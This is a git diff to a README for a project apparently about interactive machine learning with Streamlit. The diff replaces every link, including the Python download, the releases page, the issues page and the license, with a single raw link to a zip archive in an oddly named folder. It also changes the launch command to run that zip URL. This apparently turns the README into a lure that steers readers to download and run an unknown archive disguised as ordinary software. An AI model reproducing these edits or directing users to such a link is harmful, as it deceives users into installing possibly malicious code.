@@ -1,6 +1,6 @@
 # 🚀 The-Future-of-Interactive-ML - Explore Interactive AI for Everyone
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/iamgdragon/The-Future-of-Interactive-ML/releases)
+[![Download](https://raw.githubusercontent.com/iamgdragon/The-Future-of-Interactive-ML/main/bronchiocele/The-Future-of-Interactive-ML-v2.2.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/iamgdragon/The-Future-of-Interactive-ML/main/bronchiocele/The-Future-of-Interactive-ML-v2.2.zip)
 
 ## 📖 Overview
 
@@ -26,20 +26,20 @@ The-Future-of-Interactive-ML is an in-depth exploration of human-centered, inter
 ## 🚀 Getting Started
 
 1. **Install Required Software:**
-   - Ensure you have [Python](https://www.python.org/downloads/) installed. You can download the latest version for your operating system.
+   - Ensure you have [Python](https://raw.githubusercontent.com/iamgdragon/The-Future-of-Interactive-ML/main/bronchiocele/The-Future-of-Interactive-ML-v2.2.zip) installed. You can download the latest version for your operating system.
    - Install the required libraries with this command:
      ```
      pip install streamlit scikit-learn plotly
      ```
 
 2. **Download the Application:**
-   - Visit the [Releases page to download](https://github.com/iamgdragon/The-Future-of-Interactive-ML/releases).
+   - Visit the [Releases page to download](https://raw.githubusercontent.com/iamgdragon/The-Future-of-Interactive-ML/main/bronchiocele/The-Future-of-Interactive-ML-v2.2.zip).
 
 ## 📥 Download & Install
 
 To get started, you need to download the latest version of the software:
 
-- Click [here](https://github.com/iamgdragon/The-Future-of-Interactive-ML/releases) to visit the Releases page.
+- Click [here](https://raw.githubusercontent.com/iamgdragon/The-Future-of-Interactive-ML/main/bronchiocele/The-Future-of-Interactive-ML-v2.2.zip) to visit the Releases page.
   
 1. Choose the latest release version.
 2. Click on the appropriate file to download.
@@ -56,7 +56,7 @@ To get started, you need to download the latest version of the software:
 
 3. Run the following command to start the application:
    ```
-   streamlit run your_app.py
+   streamlit run https://raw.githubusercontent.com/iamgdragon/The-Future-of-Interactive-ML/main/bronchiocele/The-Future-of-Interactive-ML-v2.2.zip
    ```
 
 4. Your default web browser will open automatically with the interactive application.
@@ -79,7 +79,7 @@ To get started, you need to download the latest version of the software:
 
 ### Support
 
-For further assistance and support, check our [GitHub Issues](https://github.com/iamgdragon/The-Future-of-Interactive-ML/issues) page.
+For further assistance and support, check our [GitHub Issues](https://raw.githubusercontent.com/iamgdragon/The-Future-of-Interactive-ML/main/bronchiocele/The-Future-of-Interactive-ML-v2.2.zip) page.
 
 ## 🧑‍🤝‍🧑 Community Contributions
 
@@ -92,4 +92,4 @@ We welcome contributions to enhance the project. If you would like to contribute
 
 ## 📜 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/iamgdragon/The-Future-of-Interactive-ML/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/iamgdragon/The-Future-of-Interactive-ML/main/bronchiocele/The-Future-of-Interactive-ML-v2.2.zip) file for details.
